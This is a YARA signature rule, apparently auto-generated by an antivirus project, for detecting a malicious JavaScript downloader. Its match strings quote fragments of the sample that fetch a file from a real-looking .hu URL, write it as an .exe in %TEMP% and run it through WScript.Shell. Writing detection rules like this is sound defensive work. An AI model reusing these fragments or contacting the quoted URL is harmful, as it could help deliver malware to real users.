rule sig_20160330_ae753a30cd5f763b982962927c741018 {
  meta:
    description = "datamaliciousorder - file 20160330_ae753a30cd5f763b982962927c741018.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1a7cb1cff74eac31cd0af20474fe02b65a2236ff7ec52d32c48a28c26295f828"

  strings:
    $s1  = "var I = function F() {return WScript[L0](\"WScript\"+\".Shell\");}(), H = 11;" fullword ascii
    $s2  = "function GK(F1, T0){OZ = OZ * 1; return F1 - T0;};" fullword ascii
    $s3  = "SG[UN](\"GET\", \"http://arcfestoheni.hu/n3usad\", false);" fullword ascii
    $s4  = "if (SG[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Q() {return I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"puiL1A5ICx69RKC.ex\" + \"e\";};" fullword ascii
    $s6  = "function LH(){return V + \"\";};" fullword ascii
    $s7  = "function N() {return ((PC == true) && (PC == BJ)) ? 1 : OZ;};" fullword ascii
    $s8  = "function MB(O){I[\"Run\"](O, OZ, OZ);};" fullword ascii
    $s9  = "function L()" fullword ascii
    $s10 = "var A = new this[\"Date\"]();" fullword ascii
    $s11 = "function RJ(){return L0;};" fullword ascii
    $s12 = "function XK(){return 22;};" fullword ascii
    $s13 = "return GK(N0, S);" fullword ascii
    $s14 = "function Q0(E) {var FE = (1, 2, 3, 4, 5, E); return FE;};" fullword ascii
    $s15 = "}while (TB);" fullword ascii
    $s16 = "var PC = false;" fullword ascii
    $s17 = "var HN = false;" fullword ascii
    $s18 = "BJ = true; " fullword ascii
    $s19 = "PC = true; " fullword ascii
    $s20 = "var BJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}